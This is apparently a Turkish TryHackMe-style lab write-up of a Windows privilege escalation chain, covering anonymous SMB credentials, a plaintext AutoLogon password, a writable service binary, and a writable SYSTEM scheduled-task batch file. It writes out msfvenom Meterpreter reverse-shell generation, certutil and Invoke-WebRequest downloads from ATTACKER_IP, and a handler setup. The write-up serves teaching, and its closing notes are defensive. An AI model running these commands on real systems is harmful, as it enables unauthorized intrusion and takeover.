# Windows Jump — TryHackMe Writeup

> **Zorluk:** Orta

> **Kategori:** Windows Privilege Escalation

> **Yol:** `guest` → `thmuser` → `notadmin` → `svcadmin` → `SYSTEM`

## Giriş

Bu odada senaryo şöyle: bir zafiyet taramasında ağda unutulmuş bir Windows makinesi tespit edilmiş. Ekip küçülmesi sonrası IT tarafından düzgün temizlenmemiş, sıradan bir workstation gibi görünüyor ama içine girince katman katman kötü konfigürasyon çıkıyor. Amacımız `guest` seviyesinden başlayıp `SYSTEM` yetkisine kadar tırmanmak. Aşağıda attığım her adımı, neden o adımı attığımı ve bulduğum şeyleri elimden geldiğince detaylı anlatmaya çalıştım.

---

## 1. Enumeration

İlk iş her zaman aynı: portları görmek. Klasik agresif Nmap taraması ile başladım:

```bash
nmap -sS -A -p- 10.10.XXX.XXX
```

Çıktıda dikkatimi çeken portlar:

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664-49672/tcp open msrpc    Microsoft Windows RPC
```

`rdp-ntlm-info` script çıktısından da makinenin adını ve alan bilgisini öğrendim:

```
Target_Name: PRIVESC
NetBIOS_Domain_Name: PRIVESC
DNS_Domain_Name: privesc
Product_Version: 10.0.17763
```
<img width="979" height="757" alt="nmap1" src="https://github.com/user-attachments/assets/a38c86f0-216a-4f54-8c63-5398aeef2d5b" />

445 portu açık olduğu için ilk aklıma gelen SMB üzerinden bilgi toplamak oldu. Bunun için **NetExec (nxc)** kullandım:

```bash
nxc smb 10.10.XXX.XXX
```
<img width="1365" height="439" alt="smb" src="https://github.com/user-attachments/assets/7d8cd793-ba38-4f98-8108-b9bdbf8ef76b" />

Buradan şunları öğrendim:

- **İşletim Sistemi:** Windows Server 2019 (Build 17763) x64
- **Bilgisayar Adı:** `PRIVESC`
- **Domain/Workgroup:** `privesc`
- **SMB Signing:** Kapalı (`signing: False`) → potansiyel olarak relay saldırılarına açık
- **SMBv1:** Kapalı (`SMBv1: False`)

SMB signing'in kapalı olması ilerideki bir NTLM relay senaryosu için önemli bir detay, not düştüm.

### Anonim SMB Erişimi

SMB signing dışında, önce paylaşılan dizinlere bakmak istedim. Guest/null session ile bağlanmayı denedim:

```bash
smbclient -L //10.10.XXX.XXX -N
```

Listede `Public` adında bir paylaşım dikkatimi çekti. Hemen içine girdim:

```bash
smbclient //10.10.XXX.XXX/Public -N
```
<img width="1307" height="292" alt="smb2" src="https://github.com/user-attachments/assets/df8e0eaa-b652-4e5b-9890-22581ebf9b50" />


İçeride `welcome.txt` diye bir dosya vardı, `get` komutuyla kendi makineme çektim:

```
smb: \> get welcome.txt
```
<img width="867" height="199" alt="smbget" src="https://github.com/user-attachments/assets/95fd6b01-401f-4b47-90c1-9d4adce7a48e" />

Dosyanın içeriği tam bir hazine çıktı:

Yeni işe başlayan personel için bırakılmış varsayılan bir kimlik bilgisi... ve hiç değiştirilmemiş. Klasik ama hâlâ çok yaygın bir hata.

<img width="433" height="179" alt="welcome txt" src="https://github.com/user-attachments/assets/f267f099-10a6-4e9e-969f-54d4886a121d" />

---

## guest → thmuser

Bulduğum kimlik bilgisini önce doğrulamak için NetExec kullandım:

```bash
nxc smb 10.10.XXX.XXX -u thmuser -p 'Password1!'
```

Kimlik bilgileri geçerliydi. RDP portu açık olduğu için direkt masaüstüne bağlanmayı denedim:

```bash
xfreerdp3 /v:10.10.XXX.XXX /u:thmuser /p:'Password1!' /cert:ignore
```


Bağlantı başarılı oldu. `C:\Users\thmuser\Desktop` dizinine gidip ilk flag'i aldım:

**Soru:** What are the contents of `flag1.txt`?

**Cevap:** `THM{5mb_cr3d5_1n_th3_5h4r3}`

<img width="829" height="652" alt="flag1" src="https://github.com/user-attachments/assets/e429e3e9-23bd-476c-a03e-0f47899d07ae" />

---

##  thmuser → notadmin

`thmuser` ile içeri girdikten sonra sistemde manuel olarak biraz gezindim ama elle bir şey bulmak zaman kaybı gibi geldiği için **winPEAS** çalıştırmaya karar verdim. Kendi makinemde küçük bir HTTP sunucusu açıp aracı hedefe indirdim:

```bash
# Attacker makinesinde
python3 -m http.server 8000
```

```powershell
# Hedef makinede (thmuser oturumu)
Invoke-WebRequest http://ATTACKER_IP:8000/winPEASx64.exe -OutFile winpeas.exe
.\winpeas.exe > winpeas.txt
```

<img width="947" height="690" alt="winpeas" src="https://github.com/user-attachments/assets/fee80a3c-beec-4be2-8446-e693da3d0a5c" />


Çıktıyı incelerken **AutoLogon** başlığı altında ilginç bir şey gördüm:

```
Looking for AutoLogon credentials
Some AutoLogon credentials were found
DefaultPassword : P@ssw0rd!
```

winPEAS parolayı bulmuş ama kullanıcı adını göstermemiş. Bunun için doğrudan registry'ye baktım:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Çıktı:

```
DefaultUserName    REG_SZ    notadmin
DefaultPassword    REG_SZ    P@ssw0rd!
AutoLogonSID       REG_SZ    S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1009
LastUsedUsername   REG_SZ    notadmin
```

Yani AutoLogon için kullanılan hesap `notadmin`, parolası da düz metin halinde registry'de duruyormuş. Bu, unutulmuş/yanlış yapılandırılmış otomatik oturum açma özelliklerinin ne kadar tehlikeli olabileceğine güzel bir örnek.



Bilgileri doğrulamak için yine NetExec kullandım:

```bash
nxc smb 10.10.XXX.XXX -u notadmin -p 'P@ssw0rd!' --shares
```

Doğru çıktı. Zaten RDP oturumum açık olduğu için yeni bir oturum açmak yerine mevcut shell üzerinden `runas` ile `notadmin` context'inde bir komut istemi başlattım:

```cmd
runas /user:notadmin cmd.exe
```

*(Buraya runas komutunun çalıştırıldığı ve parola girilen ekranın ss'i eklenecek)*

Ardından:

```cmd
cd C:\Users\notadmin\Desktop
type flag2.txt
```

**Soru:** What are the contents of `flag2.txt`?
**Cevap:** `THM{w1nl0g0n_cr3ds_3xp0s3d}`

*(Buraya flag2.txt dosyasının ss'i eklenecek)*

---

## 4. notadmin → svcadmin

Odanın adımları zaten en başta `guest → thmuser → notadmin → svcadmin → SYSTEM` şeklinde verilmişti (bunu ilerledikten sonra fark ettim), yani sıradaki hedef `svcadmin` kullanıcısıydı.

Sistemde `svcadmin` adıyla çalışan bir servis olup olmadığına baktım:

```cmd
wmic service get Name,DisplayName,StartName | findstr /i svcadmin
```

Çıktıda `THMSvc` adında bir servis karşıma çıktı. Servisin detaylarını inceledim:

```cmd
sc qc THMSvc
```

*(Buraya sc qc çıktısının ss'i eklenecek — servisin çalıştırdığı binary yolu ve BINARY_PATH_NAME görünecek)*

Servisin `svcadmin` context'inde çalıştığını gördükten sonra, servisin kullandığı dizinin izinlerini kontrol ettim:

```cmd
icacls C:\Windows\THMSvc
```

Sonuç can alıcıydı: dizin normal kullanıcılar tarafından **yazılabilir** durumdaydı. Yani servis binary'sini kendi payload'ımla değiştirip servisi yeniden başlattığımda, kod `svcadmin` yetkisiyle çalışacaktı — klasik bir **binary hijacking / weak service permissions** açığı.

*(Buraya icacls çıktısının, yazma izninin göründüğü ss'i eklenecek)*

### Exploit: Reverse Shell ile svcadmin

Önce Kali/attacker makinemde msfvenom ile bir Meterpreter payload'ı ürettim:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP \
  LPORT=4444 \
  -f exe \
  -o svc.exe
```

Sonra basit bir HTTP sunucusu açıp dosyayı hedefe ulaştırdım:

```bash
python3 -m http.server 8000
```

Hedef üzerinde `certutil` ile payload'ı indirip servisin binary yoluna yerleştirdim:

```cmd
certutil -urlcache -split -f http://ATTACKER_IP:8000/svc.exe C:\Windows\THMSvc\reverse.exe
```

Ardından Metasploit tarafında bir `multi/handler` açıp servisi yeniden başlattım (ya da makine zaten yeniden başlıyorsa bekledim):

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

*(Buraya msfvenom payload üretim çıktısının ve handler'ın bağlantıyı yakaladığı anın ss'i eklenecek)*

Bağlantı geldiğinde artık `svcadmin` yetkisindeydim. Masaüstüne gidip flag'i aldım:

```cmd
cd C:\Users\svcadmin\Desktop
type flag3.txt
```

**Soru:** What are the contents of `flag3.txt`?
**Cevap:** `THM{s3rv1c3_b1n4ry_h1j4ck3d}`

*(Buraya flag3.txt dosyasının ss'i eklenecek)*

---

## 5. svcadmin → SYSTEM

Son adım için `svcadmin` yetkisiyle sistemde tekrar gezinmeye başladım. `C:\Windows\Tasks\` dizininde `cleanup.bat` adında bir dosya dikkatimi çekti. İzinlerini kontrol ettiğimde bu dosyanın da yazılabilir olduğunu ve **SYSTEM** yetkisiyle çalışan bir zamanlanmış görev (scheduled task) tarafından tetiklendiğini gördüm. Yani içeriğini değiştirip SYSTEM olarak kod çalıştırabilirdim.

Yine aynı yöntemi izledim — bu sefer payload'ı doğrudan `.bat` dosyası üzerinden tetikleyecektim:

```bash
# Attacker makinesinde payload üretimi
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# HTTP sunucusu
python3 -m http.server 8000
```

Hedef üzerinde payload'ı indirdim:

```cmd
certutil -urlcache -f http://ATTACKER_IP:8000/shell.exe C:\Windows\Temp\shell.exe
```

Ve `cleanup.bat` dosyasının içeriğini kendi payload'ımı çalıştıracak şekilde değiştirdim:

```cmd
cmd /c "echo C:\Windows\Temp\shell.exe > C:\Windows\Tasks\cleanup.bat"
```

*(Buraya cleanup.bat dosyasının izinlerinin ve üzerine yazma işleminin ss'i eklenecek)*

Zamanlanmış görev tetiklendiğinde (ya da manuel çalıştırıldığında), handler tarafında yeni bir bağlantı düştü — bu sefer **SYSTEM** yetkisiyle:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

*(Buraya SYSTEM yetkisiyle gelen meterpreter oturumunun ve `getuid` çıktısının ss'i eklenecek)*

`C:\` dizini altında son flag'i okuyarak zinciri tamamladım:

```cmd
type C:\flag4.txt
```

**Soru:** What are the contents of `flag4.txt`?
**Cevap:** `THM{t4sk_wr1t3_t0_SYST3M}`

*(Buraya flag4.txt dosyasının ss'i eklenecek)*

---

## Özet: Saldırı Zinciri

| Adım | Kullanıcı | Bulunan Zafiyet | Yöntem |
|------|-----------|-----------------|--------|
| 1 | guest → thmuser | Anonim SMB paylaşımında düz metin kimlik bilgisi | `smbclient` ile `Public` paylaşımından `welcome.txt` okuma |
| 2 | thmuser → notadmin | Registry'de düz metin AutoLogon parolası | winPEAS + `reg query` ile Winlogon anahtarı |
| 3 | notadmin → svcadmin | Zayıf servis dizini izinleri (binary hijacking) | `THMSvc` dizinine yazılabilir binary bırakma |
| 4 | svcadmin → SYSTEM | SYSTEM tarafından çalıştırılan zamanlanmış görevde yazılabilir dosya | `cleanup.bat` dosyasının üzerine payload yazma |

## Öğrendiklerim / Notlar

- Anonim SMB paylaşımları hâlâ çok yaygın bir zafiyet kaynağı; her zaman `-N` ile null session denenmeli.
- AutoLogon, kolaylık sağlasa da parolayı düz metin olarak registry'de bırakıyor — production ortamlarında kesinlikle kapatılmalı ya da Credential Manager / gMSA gibi alternatifler kullanılmalı.
- Servis binary'lerinin ve script dizinlerinin izinleri düzenli olarak `icacls` ile denetlenmeli; "Everyone: Write" gibi geniş izinler her zaman kırmızı bayrak.
- Zamanlanmış görevler de aynı şekilde denetlenmeli; SYSTEM tarafından tetiklenen ama düşük yetkili kullanıcıların yazabildiği dosyalar klasik bir privesc vektörü.
- `winPEAS` bu tür manuel bulmakta zaman kaybettiren AutoLogon/registry zafiyetlerini hızlıca ortaya çıkarmak için gerçekten işe yarıyor, ilk 15-20 dakikayı boşa harcamak yerine erkenden çalıştırılmalı.

---

*Bu writeup eğitim amaçlı, izinli bir CTF/lab ortamında (TryHackMe tarzı) yapılan çalışmayı belgelemektedir.*
